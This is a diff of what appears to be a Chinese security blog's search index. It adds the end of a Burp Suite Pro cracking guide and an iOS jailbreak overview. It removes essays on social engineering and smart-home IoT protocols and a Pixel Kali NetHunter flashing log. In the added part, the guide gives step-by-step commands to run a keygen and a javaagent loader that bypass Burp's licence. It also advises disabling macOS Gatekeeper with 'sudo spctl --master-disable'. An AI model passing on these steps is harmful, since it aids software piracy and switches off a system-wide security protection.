+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Name=burpsuite</span><br><span class="line">Encoding=UTF-8</span><br><span class="line">Exec=sh -c <span class="string">&quot;/usr/bin/burpsuite&quot;</span></span><br><span class="line">Icon=kali-burpsuite</span><br><span class="line">StartupNotify=<span class="literal">false</span></span><br><span class="line">Terminal=<span class="literal">false</span></span><br><span class="line">Type=Application</span><br><span class="line">Categories=03-webapp-analysisc;03-06-web-application-proxies;</span><br><span class="line">X-Kali-Package=burpsuite</span><br></pre></td></tr></table></figure></div>
+
+<p>ok</p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>2022.9版本的破解有些改变，根据沈沉舟大佬的描述：</p>
+<blockquote>
+<p>“2022.9版注册机制并未发生变化，仅仅是相关代码具体实现做了微调，导致class的字节码发生变化，而旧版loader模式匹配时约束条件太强，兼容性不足。”</p>
+</blockquote>
+<p>故新版本的破解流程稍有更改</p>
+<p>首先把需要的部分下载一下，我用的是mac，理论上比linux和win那边麻烦点（实际操作的时候也是很麻烦）  </p>
+<p>安装好app后，右键查看包内容，把loader和keygen移动到app路径下，主要是放在burpsuite旁边  </p>
+<p>由于这个loader名字太难打，咱直接改名burploader<br>右键打开terminal，命令启动burpsuite和keygen</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar BurpLoaderKeygen.jar</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">java -javaagent:burploader.jar -noverify -jar burpsuite_pro.jar</span><br></pre></td></tr></table></figure></div>
+
+<p>后面注册的过程都是一样的，咱直接跳到关键过程<br>注册成功后从启动台打开还是app还是没注册的样子  </p>
+<p>咱还是进入包内容，添加点内容</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">-javaagent:burploader.jar</span><br><span class="line">-noverify</span><br></pre></td></tr></table></figure></div>
+
+<p>之后就可以正常打开了</p>
+<p>P.S.<br>关于mac更新时遇到的那些操作<br>安装新版本前务必删除全部相关文件  </p>
+<p>苹果的安全机制，修改包内容后会遇到文件损坏的报错<br>这个时候直接</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo spctl --master-disable</span><br></pre></td></tr></table></figure></div>
+
+
+<p>就完事了  </p>
+]]></content>
+  </entry>
+  <entry>
+    <title>苹果端的越狱到frida hook</title>
+    <url>/2023/04/23/%E8%8B%B9%E6%9E%9C%E7%AB%AF%E7%9A%84%E8%B6%8A%E7%8B%B1%E5%88%B0frida-hook/</url>
+    <content><![CDATA[<h2 id="What-are-the-different-types"><a href="#What-are-the-different-types" class="headerlink" title="What are the different types?"></a>What are the different types?</h2><ul>
+<li>Fully Untethered</li>
+<li>Semi-Untethered</li>
+<li>Semi-Tethered</li>
+<li>Tethered</li>
+</ul>
+<h3 id="Untethered-Jailbreaks"><a href="#Untethered-Jailbreaks" class="headerlink" title="Untethered Jailbreaks"></a>Untethered Jailbreaks</h3><hr>
+<p>Untethered jailbreaks can be considered the holy grail of all jailbreaks. They only require the exploit to be ran once either via a website, an app or a computer.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://ios.cfw.guide/assets/images/p0sixpwn.png"
+                      alt="A screenshot of the p0sixspwn jailbreak"
+                ><figcaption>A screenshot of the p0sixspwn jailbreak</figcaption></figure></p>
+<p>After that, your device is fully jailbroken and won’t require any further action. The exploit will stay on a device even after you reboot it.</p>
+<p>Unfortunately, there hasn’t been a new untethered jailbreak in a very long time, and it’s likely we won’t see one for even longer.</p>
+<p>The only downside to an untethered jailbreak is that if something goes wrong, it could very well result in a bootloop requiring you to restore your device via iTunes or Finder (macOS Catalina or newer). The likelihood of this happening is <em>low</em>, but is indeed possible.</p>
+<p>A few examples of untethered jailbreaks are <a class="link"   href="https://ios.cfw.guide/installing-p0sixspwn" >p0sixspwn <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and Pangu9.</p>
+<h3 id="Semi-Untethered-Jailbreaks"><a href="#Semi-Untethered-Jailbreaks" class="headerlink" title="#Semi-Untethered Jailbreaks"></a><a class="link"   href="https://ios.cfw.guide/installing-palera1n/#semi-untethered-jailbreaks" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>Semi-Untethered Jailbreaks</h3><hr>
+<p>Semi-untethered jailbreaks have been the most popular type of jailbreak in recent years. This type of jailbreak requires an exploit to be executed every time you reboot or turn off your device.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://ios.cfw.guide/assets/images/odysseymain.png"
+                      alt="A screenshot of the Odyssey jailbreak"
+                ><figcaption>A screenshot of the Odyssey jailbreak</figcaption></figure></p>
+<p>This jailbreak works by running the exploit through an app on the device itself. The app, however, must be resigned every 7 days if sideloaded with a standard Apple ID. Utilities like AltStore, ReProvision Reborn, and AltDaemon make this process far easier.</p>
+<p>Due to the nature of how the exploit is applied, these jailbreaks are easily removable through their respective app.</p>
+<p>A few examples of semi-untethered jailbreaks include <a class="link"   href="https://ios.cfw.guide/installing-taurine" >Taurine <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, <a class="link"   href="https://ios.cfw.guide/installing-unc0ver" >unc0ver <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, and <a class="link"   href="https://ios.cfw.guide/installing-odyssey" >Odyssey <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<h3 id="Semi-Tethered-Jailbreaks"><a href="#Semi-Tethered-Jailbreaks" class="headerlink" title="#Semi-Tethered Jailbreaks"></a><a class="link"   href="https://ios.cfw.guide/installing-palera1n/#semi-tethered-jailbreaks" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>Semi-Tethered Jailbreaks</h3><hr>
+<p>Semi-tethered jailbreaks are very similar to semi-untethered jailbreaks, however the exploit must be ran using a computer rather than using a sideloaded app.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://ios.cfw.guide/assets/images/checkra1n.png"
+                      alt="A screenshot of the checkra1n jailbreak"
+                ><figcaption>A screenshot of the checkra1n jailbreak</figcaption></figure></p>
+<p>Due to requiring a computer to rejailbreak after every reboot, most choose to use a semi-untethered jailbreak instead.</p>
+<p>An example of a semi-tethered jailbreak is <a class="link"   href="https://ios.cfw.guide/installing-odysseyra1n" >Odysseyra1n <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<h3 id="Tethered-Jailbreaks"><a href="#Tethered-Jailbreaks" class="headerlink" title="#Tethered Jailbreaks"></a><a class="link"   href="https://ios.cfw.guide/installing-palera1n/#tethered-jailbreaks" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>Tethered Jailbreaks</h3><hr>
+<p>Tethered jailbreaks are not meant to be used by the general public. These exploits modify the device in a way that it requires a PC to even boot at all, even without a jailbreak.</p>
+<p>Because of this, these tend to only be used by jailbreak developers getting ready for a newer version of iOS.</p>
+<p>越狱工具-》适用于不同版本手机和ios版本</p>
 ]]></content>
   </entry>
   <entry>
@@ -833,237 +964,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>关于社会工程学的一些个人看法</title>
-    <url>/2023/04/23/%E5%85%B3%E4%BA%8E%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%AA%E4%BA%BA%E7%9C%8B%E6%B3%95/</url>
-    <content><![CDATA[<p>从何讲起呢？<br>本人从上学时了解到社会工程学这门黑客学科<br>社会工程学是指，利用人性的弱点和特性，直接对目标相关的人进行社会关系和心理学的信息套取的手段。<br>主要行动方向有两条，一方面是从目标人物已经完成的社会行为中搜索关键信息，比如，找到目标人物的网络社交账号与发表的信息等。<br>另一方面是直接接触目标人物，通过语言或肢体交流进行信息套取，这里从广泛的意义上讲，电信诈骗也是应用案例之一。</p>
-<p>我不想讲社工中的那些方法论，那些东西太死板，交给乙方公司的安服团队，公司会用这种方法完成他们的变现。</p>
-<p>而我想表达的内容应该更适合还在学习社工，并纠结与社工工作的人。</p>
-<p>首先要说的是，社工不难，而且很灵活，你通过自己的办法去发现那些信息就已经是天花板了。从互联网空间中能找到信息，一方面是互联网公司自身对客户的信息保护不够，另一方面是目标对自身信息的保护不够。<br>比如，你通过穷举法获取目标的平台账号密码，是互联网公司的措施不完善。<br>又比如，你在目标社交平台上发布的生活轨迹中发现关键信息，是目标本身对敏感信息的敏感度不足造成的。</p>
-<p>而通过这两种思路，组合打法就能帮你获取到足够多的信息了。</p>
-<p>之后要说的是，请你记住你要获取信息的目的，你只是想拿到那个password，或者拿到某个关键目标放在什么位置，或者是目标公司老板几点在公司这种信息而已。</p>
-<p>而获取信息的渠道很多，你千万不要陷入到给获取目标渠道中的这个人的人物画像当中去，那不应该是你的主要工作。</p>
-<p>可能护网工作会要求你充分溯源红队人员的个人信息，但你在做溯源的时候，只要知道是红队中的谁攻击，用的什么手段攻击即可。不需要疯狂地去完善报告中他的生活细节。可能你想通过这种方式来表现你的工作能力。<br>而护网中，真的没人在意这个人年龄多大，家里几个人，婚否，对象好不好看，喜不喜欢烟酒二次元等乱七八糟的事情。</p>
-<p>因为当你花费了大量的时间在这上面，并把一份详细且完整的画像报告交上去时，你的主管回复你，你找错目标了。请问你花费的时间和精力要谁来买单呢？</p>
-<p>不仅仅是护网工作，你会发现能用到社工手段的地方太多了，因为这个手段门槛太低，不需要你会多少计算机语言，不需要你懂不懂什么OSI七层协议框架。你只要动手去做，无论找不找得到目标信息，你都会有一定的收获。</p>
-<p>比如，你很想知道喜欢的人，这个人网络上发布了什么，喜好什么，最近在做什么。你很强，你把这些信息都拿到了，然后呢？你会发现一个很严重的问题，这些信息要怎么利用？这些信息是否真实？这些信息有多少是他想表现在网络上，而真正的信息都藏起来根本不会发布。</p>
-<p>于是你又开始分析信息，分析行为，分析社会关系，甚至开始根据这些信息开始侧写。</p>
-<p>这个时候，如果你不是为了相关工作去调查犯罪嫌疑人，那你已经是一个不折不扣的大变态了。</p>
-<p>你只是为了满足你那肮脏不堪的窥私欲而已。</p>
-<p>这些信息看得多了，你会发现人性的不堪，因为你会发现很多人被自身的欲望裹挟而做出的徘徊于人性边缘的事情。你开始会对每一个人都保持距离感，并对人性保持一种相当的怀疑态度。</p>
-<p>没错，你走火入魔了，你太依赖于社会工程学了。</p>
-<p>我要说的是，社工是一门手段，但不是万金油。</p>
-<p>企业可以通过相应的管理制度来规避社工攻击带来的风险，人本身也可以通过学习相关知识并改变生活中的一些行为来规避社工攻击。同时，我上面讲过，人在网络上表达的内容仅仅是想让你看到的内容，那并不是真实的。</p>
-<p>以上，</p>
-<p>在我对自身的社工防范手段做到位了之后，就不在社工这件事本身再投入精力了。</p>
-<p>毕竟把太多的精力放在对人的信息挖掘上，目光未免太过狭窄。</p>
-<p>地球在宇宙中存在了46亿年，陆地总面积约14900万平方千米，地球总人口约78.88亿，人类平均寿命大约是76岁，你大约已经用掉了30%，那么你大约还有五十多年的时间，去了解历史、丈量土地、遇见更多的人。</p>
-<p>在此希望你能为祖国健康工作50年。</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>由智能家居入门物联网安全（没写完，是个半成品</title>
-    <url>/2023/04/23/%E7%94%B1%E6%99%BA%E8%83%BD%E5%AE%B6%E5%B1%85%E5%85%A5%E9%97%A8%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/</url>
-    <content><![CDATA[<h2 id="何为智能家居"><a href="#何为智能家居" class="headerlink" title="何为智能家居"></a>何为智能家居</h2><p>智能家居（smart home, home automation）是以住宅为平台，利用综合布线技术、网络通信技术、 安全防范技术、自动控制技术、音视频技术将家居生活有关的设施集成，构建高效的住宅设施与家庭日程事务的管理系统，提升家居安全性、便利性、舒适性、艺术性，并实现环保节能的居住环境。</p>
-<h2 id="何为物联网"><a href="#何为物联网" class="headerlink" title="何为物联网"></a>何为物联网</h2><p>物联网技术（Internet of Things，IoT）起源于传媒领域，是信息科技产业的第三次革命。物联网是指通过信息传感设备，按约定的协议，将任何物体与网络相连接，物体通过信息传播媒介进行信息交换和通信，以实现智能化识别、定位、跟踪、监管等功能。</p>
-<h2 id="智能家居用到的通信协议"><a href="#智能家居用到的通信协议" class="headerlink" title="智能家居用到的通信协议"></a>智能家居用到的通信协议</h2><p>无线协议</p>
-<p>一、Wifi技术</p>
-<p>　　生活中最常见的无线协议。采用的是国内2.4G免费频段，直接连入互联网，手机下载APP，就可以直接进行控制。Wifi最初就是为了实现大数据在小范围内的无线传输而设计的，所以设计之初并没有考虑其他的因素。以至于应用到目前智能家居系统并不是很合适。Wifi只支持星型网络拓扑结构，通过多基站的方式实现网络空间拓展。协议稳定性、安全性比较差，容易断开连接，被人破解。wifi在功率消耗上面能耗巨大，假如家里面安装了许多的wifi产品，那么一个月下来用电量都不可小视。Wifi设计只有16个信道，而且其中有一个是占用的，理论上是可以连接15个产品但是实际中连接10个就极不稳定了。一个家庭产品上面远远不止10个。Wifi的穿墙能力和衍射能力较弱等等，这些方面就足以说明wifi不适合做智能家居系统。</p>
-<p>　　二、蓝牙技术</p>
-<p>　　蓝牙也是生活中最常见的协议，接触最多的就是手机蓝牙配对和蓝牙音箱了，通过短距离的无线通讯，可以传输大数据，为生活带来了许多便捷之处。蓝牙的功耗低于wifi，传输距离较近，一般低于10米，无法进行组网，其次蓝牙堆栈(stack)很容易奔溃。蓝牙节点也比较少，在稳定性和受干扰能力方面也不是很强。所以不适合做成智能家居系统。</p>
-<p>　　三、射频433</p>
-<p>　　433MHz的显著优势是无线信号的穿透性强、能够传播得更远。但其缺点也是很明显的，就是其数据传输速率只有9600bps，因此433Mhz技术一般只适用于数据传输量较少的应用场合。从通讯可靠性的角度来讲，433Mhz技术和WiFi一样，只支持星型网络的拓扑结构，通过多基站的方式实现网络覆盖空间的扩展，因此其无线通讯的可靠性和稳定性也逊于Z-Wave与Zigbee技术。另外，不同于Z-Wave，Zigbee和WiFi技术中所采用的加密功能，433MHZ系统，它的致命弱点是系统安全保密性差，很容易被攻击，被破译。</p>
-<p>　　四、z-wave协议</p>
-<p>　　Zwave的数据传输速率为9.6kbps，信号的有效覆盖在室内30米（室外大于100米），适用于窄带宽应用场合，且具备一定的安全性和稳定性，不过目前只应用于家庭自动化方面。究其缺点主要有三个：①是节点较少，理论值为256个，实际值可能只有150个左右，算是其能容纳设备数量的上限，实际上很多厂商能做到容纳20、30个设备就不错了。②是树状组网结构，一旦树枝上端断掉，下端的所有设备将无法与网关通信。③是没有加密方式，安全性差，易受到攻击。（Zwave所用频段在我国是非民用的，国内Zwave智能家居并不常见，更多的还是应用在国外。）</p>
-<p>　　五、ZigBee协议</p>
-<p>　　在智能家居领域，ZigBee协议是公认的目前最适合的协议之一。Zigbee具备双向通讯的能力，不仅能发送命令到设备，同时设备也会把执行状态反馈回来，这对终端使用体验至关重要，尤其是安防设备，倘若你点击了关门，却不知道门是否真的已经锁上，将会带来多大的安全隐患；此外，Zigbee采用了极低功耗设计，可以全电池供电，理论上一节电池能使用10年以上，节能环保。ZigBee介质存取层网络拓扑结构多样，分为星状拓扑结构，树状拓扑结构和网状拓扑结构。在信号传输方面，ZigBee的每一个产品都是一个中继器，产品之间信号可以连跳7次，所以ZigBee协议节点具有多达65000个，但是实际应用中200-300个节点时稳定性上就会衰减。ZigBee网络节点不仅本身可以作为监控对象，还可以自动中转别的网络节点传过来的数据资料。采用扩频技术对ZigBee的抗干扰能力进行改进和完善，可以起到避开干扰的作用。当系统网络受到干扰时，整个网络整以动态的方式切换到另一信道上。在安全性上面采用AES128位高级加密法，确保了整个系统的安全可靠。</p>
-<p>　　综上所述：ZigBee协议具有自组网能力，安全性、可靠性高，抗干扰能力，自我恢复能力都比较强。具有极低的功耗，因此也是目前国内最适合智能家居的无线通讯协议。</p>
-<p>　　6、EnOcean：2012年3月，国际电工技术委员会将EnOcean无线通信标准采纳为国际标准“ISO&#x2F;IEC 14543-3-10”[1] ，这也是世界上唯一使用能量采集技术的无线国际标准。</p>
-<p>　　EnOcean技术和同类技术相比，功耗最低，传输距离最远，可以组网并且支持中继等功能，主要应用在一些无线无源智能家居和智能楼宇产品上。</p>
-<p>　　7、Lora：LoRa 是LPWAN通信技术中的一种，是美国Semtech公司采用和推广的一种基于扩频技术的超远距离无线传输方案。这一方案改变了以往关于传输距离与功耗的折衷考虑方式，为用户提供一种简单的能实现远距离、长电池寿命、大容量的系统，进而扩展传感网络。目前，LoRa 主要在全球免费频段运行，包括433、868、915 MHz等。</p>
-<p>　　LoRa技术具有远距离、低功耗（电池寿命长）、多节点、低成本的特性。</p>
-<p>　　8、NB-IOT：基于蜂窝的窄带物联网（Narrow Band Internet of Things, NB-IoT）,NB-IoT构建于蜂窝网络，只消耗大约180KHz的带宽，可直接部署于GSM网络、UMTS网络或LTE网络，以降低部署成本、实现平滑升级。</p>
-<p>　　NB-IoT是IoT领域一个新兴的技术，支持低功耗设备在广域网的蜂窝数据连接，也被叫作低功耗广域网(LPWAN)。NB-IoT支持待机时间长、对网络连接要求较高设备的高效连接。据说NB-IoT设备电池寿命可以提高至至少10年，同时还能提供非常全面的室内蜂窝数据连接覆盖。</p>
-<p>　　NB-IoT具备四大特点：一是广覆盖，将提供改进的室内覆盖，在同样的频段下，NB-IoT比现有的网络增益20dB，相当于提升了100倍覆盖区域的能力；二是具备支撑海量连接的能力，NB-IoT一个扇区能够支持10万个连接，支持低延时敏感度、超低的设备成本、低设备功耗和优化的网络架构；三是更低功耗，NB-IoT终端模块的待机时间可长达10年；四是更低的模块成本，企业预期的单个接连模块不超过5美元。</p>
-<p>　　NB-IOT聚焦于低功耗广覆盖（LPWA）物联网（IOT）市场，是一种可在全球范围内广泛应用的新兴技术。其具有覆盖广、连接多、速率低、成本低、功耗低、架构优等特点。NB-IOT使用License频段，可采取带内、保护带或独立载波三种部署方式，与现有网络共存。</p>
-<p>有线协议</p>
-<p>1、RS485：RS-485又名TIA-485-A, ANSI&#x2F;TIA&#x2F;EIA-485或TIA&#x2F;EIA-485。</p>
-<p>　　RS485是一个定义平衡数字多点系统中的驱动器和接收器的电气特性的标准，该标准由电信行业协会和电子工业联盟定义。使用该标准的数字通信网络能在远距离条件下以及电子噪声大的环境下有效传输信号。RS-485使得廉价本地网络以及多支路通信链路的配置成为可能。</p>
-<p>　　RS485有两线制和四线制两种接线，四线制只能实现点对点的通信方式，现很少采用，现在多采用的是两线制接线方式，这种接线方式为总线式拓扑结构，在同一总线上最多可以挂接32个节点。</p>
-<p>　　很多主流的有线智能家居厂家采用的都是RS485协议。</p>
-<p>　　2、RS232：个人计算机上的通讯接口之一，由电子工业协会所制定的异步传输标准接口。通常 RS-232 接口以9个引脚 (DB-9) 或是25个引脚 (DB-25) 的型态出现，一般个人计算机上会有两组 RS-232 接口，分别称为 COM1 和 COM2。很多老式电脑的接口用的就是这种通讯协议。少数的智能家居产品会采用这种协议。</p>
-<p>　　3、Modbus：Modbus是由Modicon（现为施耐德电气公司的一个品牌）在1979年发明的，是全球第一个真正用于工业现场的总线协议。</p>
-<p>　　ModBus网络是一个工业通信系统，由带智能终端的可编程序控制器和计算机通过公用线路或局部专用线路连接而成。其系统结构既包括硬件、亦包括软件。它可应用于各种数据采集和过程监控。</p>
-<p>　　ModBus网络只有一个主机，所有通信都由他发出。网络可支持247个之多的远程从属控制器，但实际所支持的从机数要由所用通信设备决定。采用这个系统，各PC可以和中心主机交换信息而不影响各PC执行本身的控制任务。</p>
-<p>　　4、KNX：1999年5月，欧洲三大总线协议EIB、BatiBus和EHSA合并成立了Konnex协会，提出了KNX协议。该协议以EIB为基础，兼顾了BatiBus和EHSA的物理层规范，并吸收了BatiBus和EHSA中配置模式等优点，提供了家庭、楼宇自动化的完整解决方案。</p>
-<p>　　KNX 总线是独立于制造商和应用领域的系统。 通过所有的总线设备连接到 KNX 介质上 ( 这些介质包括双绞线、射频、电力线或 IP&#x2F;Ethernet), 它们可以进行信息交换。总线设备可以是传感器也可以是执行器，用于控制楼宇管理装置如： 照明 , 、遮光 &#x2F; 百叶窗、保安系统、能源管理、 供暖、通风、空调系统、信号和监控系统、服务界面及楼宇控制系统、远程控制、计量、视频 &#x2F; 音频控制、大型家电等。所有这些功能通过一个统一的系统就可以进行控制、监视和发送信号，不需要额外的控制中心。</p>
-<h2 id="了解ZigBee协议"><a href="#了解ZigBee协议" class="headerlink" title="了解ZigBee协议"></a>了解ZigBee协议</h2><h2 id="了解MQTT协议"><a href="#了解MQTT协议" class="headerlink" title="了解MQTT协议"></a>了解MQTT协议</h2><h2 id="中控系统"><a href="#中控系统" class="headerlink" title="中控系统"></a>中控系统</h2><h2 id="中控系统的搭建"><a href="#中控系统的搭建" class="headerlink" title="中控系统的搭建"></a>中控系统的搭建</h2><h2 id="环境中存在的隐患"><a href="#环境中存在的隐患" class="headerlink" title="环境中存在的隐患"></a>环境中存在的隐患</h2><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>没写完，是个半成品</p>
-<blockquote>
-<p>参考：</p>
-</blockquote>
-<p><a class="link"   href="https://baike.baidu.com/item/%E6%99%BA%E8%83%BD%E5%AE%B6%E5%B1%85/686345?fr=aladdin" >https://baike.baidu.com/item/%E6%99%BA%E8%83%BD%E5%AE%B6%E5%B1%85/686345?fr=aladdin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>简单记录pixel 3XL刷KaliNetHunter的过程</title>
-    <url>/2023/04/23/%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95pixel-3XL%E5%88%B7KaliNetHunter%E7%9A%84%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h2><p>根据kali官方介绍，目前已有大佬开发出相应的kernel用来支持kalinethunter的安装<br><a class="link"   href="https://nethunter.kali.org/kernels.html" >https://nethunter.kali.org/kernels.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/pixel_kali/Pasted image 20230327192859.1x5kw9e5q1gg.webp"
-                      alt="Pasted image 20230327192859" 
-                ><figcaption>Pasted image 20230327192859</figcaption></figure></p>
-<p>我的pixel3XL刚好就在这里<br>那就好办了，<br>看看环境需求：<br>刷原生Android12，刷大佬的kernel<br>看看大佬的介绍页怎么写的：<br><a class="link"   href="https://forum.xda-developers.com/t/kernel-nethunter-for-pixel-3-and-pixel-3-xl-blueline-crosshatch.4456799/" >https://forum.xda-developers.com/t/kernel-nethunter-for-pixel-3-and-pixel-3-xl-blueline-crosshatch.4456799/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/pixel_kali/Pasted image 20230327193057.2i6h1bvt4zs0.webp"
-                      alt="Pasted image 20230327193057" 
-                ><figcaption>Pasted image 20230327193057</figcaption></figure></p>
-<p>需要先用twrp把他的kernel相关文件刷进去<br>然后安装busybox<br>安装Wireless_firmware.zip<br>安装nethunter相关软件<br>升级<br>重启</p>
-<p>再看看大佬的gayhub<br><a class="link"   href="https://github.com/V3rB0se/Alynx-Nethunter" >https://github.com/V3rB0se/Alynx-Nethunter <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/pixel_kali/Pasted image 20230327194001.5295ygwtwsw0.webp"
-                      alt="Pasted image 20230327194001" 
-                ><figcaption>Pasted image 20230327194001</figcaption></figure></p>
-<p>那就好办了，需要的文件都提供了，开搞！</p>
-<p>twrp的安装本身是个问题，因为官方也说了，安不进去，需要了刷两遍，前提是刷进第三方系统<br><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/pixel_kali/Pasted image 20230327192630.4u3n6zytawa0.webp"
-                      alt="Pasted image 20230327192630" 
-                ><figcaption>Pasted image 20230327192630</figcaption></figure></p>
-<p>那我就用lineageos先搞一下，避免之后不能root</p>
-<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="刷第三方系统"><a href="#刷第三方系统" class="headerlink" title="刷第三方系统"></a>刷第三方系统</h3><p>根据LineageOS安装引导，<br>下载对应版本的img和zip，准备导入</p>
-<p>重启至bootloader</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb reboot bootloader</span><br></pre></td></tr></table></figure></div>
-
-<p>刷镜像进去</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastboot flash boot &lt;name&gt;.img</span><br></pre></td></tr></table></figure></div>
-
-<p>然后重启到Recovery Mod<br>点击Factory Reset，再Format data &#x2F; factory reset，恢复出厂设置，格式化数据<br>回到主菜单，找 Apply from ADB</p>
-<p>然后侧载文件</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb sideload &lt;name&gt;.zip</span><br></pre></td></tr></table></figure></div>
-<p>侧载结束，第三方系统安装完毕，准备安装twrp</p>
-<h3 id="刷twrp"><a href="#刷twrp" class="headerlink" title="刷twrp"></a>刷twrp</h3><p>twrp的安装稍微又些棘手，不过可以借用lineageOS的boot来解决。<br>同样是使用侧载功能</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb sideload twrp.img</span><br></pre></td></tr></table></figure></div>
-<p>这样安装的twrp是可以使用的，但会覆盖掉lineageOS的分区，此时就要注意<br>twrp侧载安装会覆盖a、b两个分区，所以之后又要用LineageOS的img再刷一次，以保证系统的正常启动。</p>
-<p>twrp侧载之后，使用adb，将后续需要安装的包一股脑全都放进去</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb push &lt;要导入的包&gt; /path</span><br></pre></td></tr></table></figure></div>
-<p>这里包括Alynx-12-nethunter-bluecross.zip、Wireless_firmware.zip、Magisk-v25.2.apk</p>
-<p>由于twrp已经覆盖了a、b两个区，后续启动是个问题，用fastboot再次覆盖安装lineageOS<br>就可以引导启动系统，并开始Magisk的操作</p>
-<p>启动Magick app，修复引导镜像，<br>使用adb把镜像拉到pc上，</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb pull &lt;magick-什么玩应来着&gt;.img</span><br></pre></td></tr></table></figure></div>
-<p>使用fastboot，把这个镜像安装到recovery区</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastboot flash recovery &lt;magick-什么玩应来着&gt;.img</span><br></pre></td></tr></table></figure></div>
-
-<p>再次启动系统，应该就能root了</p>
-<p>然后再看F-Droid这个app，进入后安装nethunter store<br>后面的懒得教了，一看就知道<br>大不了全装了</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>苹果端的越狱到frida hook</title>
-    <url>/2023/04/23/%E8%8B%B9%E6%9E%9C%E7%AB%AF%E7%9A%84%E8%B6%8A%E7%8B%B1%E5%88%B0frida-hook/</url>
-    <content><![CDATA[<h2 id="What-are-the-different-types"><a href="#What-are-the-different-types" class="headerlink" title="What are the different types?"></a>What are the different types?</h2><ul>
-<li>Fully Untethered</li>
-<li>Semi-Untethered</li>
-<li>Semi-Tethered</li>
-<li>Tethered</li>
-</ul>
-<h3 id="Untethered-Jailbreaks"><a href="#Untethered-Jailbreaks" class="headerlink" title="Untethered Jailbreaks"></a>Untethered Jailbreaks</h3><hr>
-<p>Untethered jailbreaks can be considered the holy grail of all jailbreaks. They only require the exploit to be ran once either via a website, an app or a computer.</p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://ios.cfw.guide/assets/images/p0sixpwn.png"
-                      alt="A screenshot of the p0sixspwn jailbreak"
-                ><figcaption>A screenshot of the p0sixspwn jailbreak</figcaption></figure></p>
-<p>After that, your device is fully jailbroken and won’t require any further action. The exploit will stay on a device even after you reboot it.</p>
-<p>Unfortunately, there hasn’t been a new untethered jailbreak in a very long time, and it’s likely we won’t see one for even longer.</p>
-<p>The only downside to an untethered jailbreak is that if something goes wrong, it could very well result in a bootloop requiring you to restore your device via iTunes or Finder (macOS Catalina or newer). The likelihood of this happening is <em>low</em>, but is indeed possible.</p>
-<p>A few examples of untethered jailbreaks are <a class="link"   href="https://ios.cfw.guide/installing-p0sixspwn" >p0sixspwn <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and Pangu9.</p>
